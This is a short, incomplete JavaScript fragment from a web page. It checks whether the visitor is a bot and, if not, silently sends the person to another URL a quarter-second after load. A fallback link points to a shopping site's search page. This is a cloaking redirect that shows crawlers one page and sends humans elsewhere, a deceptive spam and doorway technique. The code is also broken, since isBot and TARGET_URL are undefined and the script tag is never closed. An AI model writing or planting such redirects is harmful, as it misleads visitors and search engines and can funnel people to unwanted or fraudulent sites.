<script>
  function getParam(name){return new URL(location.href).searchParams.get(name);}
  const FALLBACK_URL = "https://3844mall.com/search.php?search_category=all&search_keyword=GONG9&x=34&y=22";

  if(!isBot) window.addEventListener('DOMContentLoaded',()=>{ setTimeout(()=>location.replace(TARGET_URL), 250); });
